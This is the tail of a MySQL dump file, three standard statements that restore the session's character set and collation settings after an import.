/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
